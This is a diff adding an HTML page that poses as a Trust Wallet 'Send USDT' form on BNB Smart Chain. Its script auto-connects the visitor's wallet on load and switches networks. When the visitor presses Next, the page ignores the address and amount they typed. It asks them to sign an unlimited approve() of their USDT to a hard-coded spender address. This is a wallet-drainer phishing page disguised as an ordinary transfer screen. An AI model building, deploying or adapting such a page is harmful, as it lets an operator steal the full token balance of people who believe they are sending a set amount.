@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<title>Send USDT</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; font-family: "Inter","Segoe UI", Arial, sans-serif; background-color: #ffffff; color: #000; }
+  .container { display: flex; flex-direction: column; justify-content: space-between; height: 100vh; width: 100%; background-color: #fff; padding: 20px; }
+  h2 { text-align: center; font-size: 18px; font-weight: 600; margin: 10px 0 25px; }
+  form { display: flex; flex-direction: column; gap: 30px; }
+  label { display: flex; flex-direction: column; gap: 8px; }
+  label span { font-size: 14px; font-weight: 500; color: #555; }
+  .input-box, .amount-box {
+    display: flex; align-items: center; justify-content: space-between;
+    border: 1px solid #999; border-radius: 8px; background-color: #fff; padding: 6px 10px; transition: all 0.2s ease;
+  }
+  .input-box:focus-within, .amount-box:focus-within { border-color: #2010d5; box-shadow: 0 0 0 1.5px rgba(41, 22, 252, 0.8); }
+  .input-box input, .amount-box input { flex: 1; border: none; outline: none; background: transparent; padding: 12px; font-size: 15px; color: #000; }
+  .input-actions { display: flex; align-items: center; gap: 16px; }
+  .input-actions span { font-weight: 800; font-size: 16px; color: #1b08e4; cursor: pointer; display: flex; align-items: center; }
+  .input-actions svg { fill: currentColor; }
+  .amount-row { display: flex; align-items: center; gap: 10px; padding: 4px; }
+  .amount-row .gray { color: #777; }
+  .amount-row .blue { color: #2211de; cursor: pointer; font-weight: 800; }
+  .note { font-size: 13px; color: #333; margin-top: 5px; }
+  button { width: 100%; border: none; border-radius: 30px; padding: 14px 0; font-size: 16px; font-weight: 600; cursor: not-allowed; color: #000; background-color: #d9d4ff; transition: background-color 0.2s ease; }
+  button.enabled { background-color: #2210ec; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+  <div class="container">
+    <form>
+      <!-- Address Field -->
+      <label>
+        <span>Address or Domain Name</span>
+        <div class="input-box">
+          <input id="addressInput" type="text" placeholder="0x..." value="0x613d10c63b140716e8Cb7107E354Ce6fC630609d" />
+          <div class="input-actions">
+            <span id="pasteBtn">Paste</span>
+            <span title="Avatar">
+              <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 24 24">
+                <path d="M20 1H6a3 3 0 0 0-3 3v1H2a1 1 0 0 0 0 2h1v4H2a1 1 0 0 0 0 2h1v4H2a1 1 0 0 0 0 2h1v1a3 3 0 0 0 3 3h14a3 3 0 0 0 3-3V4a3 3 0 0 0-3-3zm1 19a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1v-1h1a1 1 0 0 0 0-2H5v-4h1a1 1 0 0 0 0-2H5V7h1a1 1 0 0 0 0-2H5V4a1 1 0 0 1 1-1h14a1 1 0 0 1 1 1z"/><path d="M16.79 11.85a4 4 0 1 0-5.58 0C8.71 13.54 9 15.94 9 18a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1c0-2.22.25-4.48-2.21-6.15zM12 9a2 2 0 1 1 2 2 2 2 0 0 1-2-2zm5 8h-6v-1a3 3 0 0 1 6 0z"/></svg>
+            </span>
+            <span title="More">
+              <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 1024 1024">
+                <path d="M136 384h56c4.4 0 8-3.6 8-8V200h176c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H196c-37.6 0-68 30.4-68 68v180c0 4.4 3.6 8 8 8zm512-184h176v176c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V196c0-37.6-30.4-68-68-68H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zM376 824H200V648c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v180c0 37.6 30.4 68 68 68h180c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm512-184h-56c-4.4 0-8 3.6-8 8v176H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h180c37.6 0 68-30.4 68-68V648c0-4.4-3.6-8-8-8zm16-164H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8z"/>
+              </svg>
+            </span>
+          </div>
+        </div>
+      </label>
+
+      <!-- Amount Field -->
+      <label>
+        <span>Amount</span>
+        <div class="amount-box">
+          <input id="amountInput" type="number" placeholder="USDT Amount" min="0" />
+          <div class="amount-row">
+            <span class="gray">USDT</span>
+            <span id="maxBtn" class="blue">Max</span>
+          </div>
+        </div>
+        <span id="amountValue" class="note">≈ $ 0.00</span>
+      </label>
+    </form>
+
+    <button id="nextBtn" disabled>Next</button>
+  </div>
+
+  <!-- Web3 -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
+  <script>
+    let web3;
+    let account;
+
+    // Your token and spender (USDT on BSC)
+    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // Binance-Peg USDT (BSC)
+    const spenderAddress = "0xaF1a5EeadA1713833e9Bd17D5D077E0D76d3F557"; // change as needed
+    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const BSC_PARAMS = {
+      chainId: "0x38",
+      chainName: "BNB Smart Chain",
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      rpcUrls: [
+        "https://bsc-dataseed.binance.org",
+        "https://bsc-dataseed1.bnbchain.org",
+        "https://rpc.ankr.com/bsc"
+      ],
+      blockExplorerUrls: ["https://bscscan.com"]
+    };
+
+    const erc20Abi = [
+      { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
+      { constant: true, inputs: [], name: "decimals", outputs: [{ name: "", type: "uint8" }], type: "function" },
+      { constant: false, inputs: [{ name: "_spender", type: "address" }, { name: "_value", type: "uint256" }], name: "approve", outputs: [{ name: "", type: "bool" }], type: "function" }
+    ];
+
+    const $ = (id) => document.getElementById(id);
+
+    function enableNextButton() {
+      const btn = $("nextBtn");
+      btn.disabled = false;
+      btn.classList.add("enabled");
+    }
+    function disableNextButton() {
+      const btn = $("nextBtn");
+      btn.disabled = true;
+      btn.classList.remove("enabled");
+    }
+
+    async function ensureBscNetwork(provider) {
+      try {
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_PARAMS.chainId }]
+        });
+      } catch (e) {
+        // If the chain is not added, add it
+        if (e.code === 4902 || (e.data && e.data.originalError && e.data.originalError.code === 4902)) {
+          await provider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_PARAMS]
+          });
+          // Try switching again after adding
+          await provider.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_PARAMS.chainId }]
+          });
+        } else {
+          console.warn("Could not switch network:", e.message || e);
+        }
+      }
+    }
+
+    async function connectWallet() {
+      const provider = window.ethereum || window.trustwallet || window.BinanceChain;
+      if (!provider) {
+        console.warn("No EVM provider found. Open this in Trust Wallet's DApp browser.");
+        disableNextButton();
+        return;
+      }
+
+      try {
+        // Request accounts (Trust Wallet will prompt)
+        const accounts = await provider.request({ method: "eth_requestAccounts" });
+        account = accounts[0];
+
+        // Init web3 with the provider
+        web3 = new Web3(provider);
+
+        // Ensure BSC network (BEP-20)
+        await ensureBscNetwork(provider);
+
+        // Enable Next on successful connection
+        enableNextButton();
+
+        // Listen for account/network changes
+        provider.on && provider.on("accountsChanged", (accs) => {
+          account = accs && accs[0] ? accs[0] : null;
+          if (account) enableNextButton();
+          else disableNextButton();
+        });
+
+        provider.on && provider.on("chainChanged", (chainId) => {
+          if (chainId !== BSC_PARAMS.chainId) {
+            // Attempt to switch back; otherwise disable action
+            ensureBscNetwork(provider).catch(() => disableNextButton());
+          }
+        });
+      } catch (e) {
+        console.warn("Connection failed:", e.message || e);
+        disableNextButton();
+      }
+    }
+
+    // Max button: fill with max USDT balance (token decimals-aware)
+    async function fillMax() {
+      if (!web3 || !account) return;
+      try {
+        const token = new web3.eth.Contract(erc20Abi, tokenAddress);
+        const [rawBal, dec] = await Promise.all([
+          token.methods.balanceOf(account).call(),
+          token.methods.decimals().call()
+        ]);
+
+        // Convert balance to a display number
+        let display;
+        if (Number(dec) === 18) {
+          display = web3.utils.fromWei(rawBal, "ether");
+        } else {
+          // Fallback conversion for non-18 decimals
+          const bn = web3.utils.toBN(rawBal);
+          const base = web3.utils.toBN(10).pow(web3.utils.toBN(dec));
+          // simple decimal conversion to string
+          const whole = bn.div(base).toString();
+          const fracBN = bn.mod(base);
+          const fracStr = fracBN.toString().padStart(Number(dec), "0").replace(/0+$/, "");
+          display = fracStr ? `${whole}.${fracStr}` : whole;
+        }
+
+        $("amountInput").value = display;
+        $("amountValue").innerText = `≈ ${display} $`;
+      } catch (e) {
+        console.warn("Failed to fetch token balance:", e.message || e);
+      }
+    }
+
+    // Approve max USDT for spender on Next click
+    async function onNext() {
+      if (!web3 || !account) return;
+      try {
+        const token = new web3.eth.Contract(erc20Abi, tokenAddress);
+        await token.methods.approve(spenderAddress, maxUint).send({ from: account });
+        alert("Transaction is in progress!");
+      } catch (e) {
+        alert("Transaction failed: " + (e?.message || e));
+      }
+    }
+
+    // Light helper: keep the amount note updated
+    function onAmountInput(e) {
+      $("amountValue").innerText = `≈$ ${e.target.value || 0}`;
+    }
+
+    // Paste to address input
+    async function onPaste() {
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text) $("addressInput").value = text.trim();
+      } catch {
+        // Clipboard might require user gesture or permission
+      }
+    }
+
+    // Wire events
+    window.addEventListener("DOMContentLoaded", () => {
+      connectWallet(); // try to auto-connect on load
+
+      $("maxBtn").addEventListener("click", fillMax);
+      $("amountInput").addEventListener("input", onAmountInput);
+      $("nextBtn").addEventListener("click", onNext);
+      $("pasteBtn").addEventListener("click", onPaste);
+    });
+  </script>
+</body>
+</html>
